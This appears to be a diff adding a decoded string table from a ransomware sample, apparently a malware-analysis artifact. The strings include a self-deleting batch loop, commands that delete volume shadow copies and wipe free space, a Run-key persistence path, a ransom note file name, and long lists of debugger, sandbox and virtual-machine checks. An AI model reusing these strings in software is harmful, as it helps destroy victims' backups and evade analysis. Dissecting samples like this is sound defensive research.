@@ -1,0 +1,108 @@
+0x0 dwm.exe
+0x1 taskhost.exe
+0x2 taskeng.exe
+0x3 explorer.exe
+0x4 :l
+rd /S /Q "%s"
+if exist "%s" goto l
+0x5 V:%08X
+T:%s
+0x6 userenv.dll
+0x7 user32.dll
+0x8 ntdll.dll
+0x9 kernel32.dll
+0xa MessageBoxA
+0xb GetUserProfileDirectoryW
+0xc NtQueryInformationProcess
+0xd NtSetInformationThread
+0xe BlockInput
+0xf NtClose
+0x10 IsDebuggerPresent
+0x11 CheckRemoteDebuggerPresent
+0x12 Software\Microsoft\Windows\CurrentVersion\Run
+0x13 HELP_DECRYPT_FILES.html
+0x14 vssadmin
+0x15 delete shadows /all /quiet
+0x16 cipher
+0x17 /W:%c
+0x18 .link
+0x19 onion.
+0x1a https://
+0x1b PSUAService.exe
+0x1c dwmapi.dll
+0x1d avghookx.dll
+0x1e avghooka.dll
+0x1f SbieDll.dll
+0x20 dbghelp.dll
+0x21 snxhk.dll
+0x22 api_log.dll
+0x23 dir_watch.dll
+0x24 vmcheck.dll
+0x25 wpespy.dll
+0x26 pstorec.dll
+0x27 sample.exe
+0x28 C:\InsideTm\
+0x29 wine_get_unix_file_name
+0x2a SANDBOX
+0x2b VIRUS
+0x2c MALWARE
+0x2d MALTEST
+0x2e TEQUILABOOMBOOM
+0x2f \SAMPLE
+0x30 \VIRUS
+0x31 SANDBOX
+0x32 HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0
+0x33 HARDWARE\DESCRIPTION\System
+0x34 Identifier
+0x35 SystemBiosVersion
+0x36 VideoBiosVersion
+0x37 VBOX
+0x38 VIRTUALBOX
+0x39 QEMU
+0x3a drivers\VBoxMouse.sys
+0x3b VMWARE
+0x3c SOFTWARE\VMware, Inc.\VMware Tools
+0x3d drivers\vmmouse.sys
+0x3e drivers\vmhgfs.sys
+0x3f \\.\PhysicalDrive0
+0x40 LdrLoadDll
+0x41 devenv.exe
+0x42 csrss.exe
+0x43 %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
+0x44 OLLYDBG
+0x45 WinDbgFrameClass
+0x46 Immunity Debugger
+0x47 Zeta Debugger
+0x48 Rock Debugger
+0x49 ObsidianGUI
+0x4a ollydbg.exe
+0x4b ProcessHacker.exe
+0x4c tcpview.exe
+0x4d autoruns.exe
+0x4e autorunsc.exe
+0x4f filemon.exe
+0x50 procmon.exe
+0x51 procexp.exe
+0x52 netmon.exe
+0x53 idaq.exe
+0x54 idaq64.exe
+0x55 ImmunityDebugger.exe
+0x56 Wireshark.exe
+0x57 dumpcap.exe
+0x58 HookExplorer.exe
+0x59 ImportREC.exe
+0x5a PETools.exe
+0x5b LordPE.exe
+0x5c SysInspector.exe
+0x5d proc_analyser.exe
+0x5e sysAnalyzer.exe
+0x5f sniff_hit.exe
+0x60 windbg.exe
+0x61 joeboxcontrol.exe
+0x62 joeboxserver.exe
+0x63 prl_cc.exe
+0x64 prl_tools.exe
+0x65 VMSrvc.exe
+0x66 VMUSrvc.exe
+0x67 xenservice.exe
+0x68 
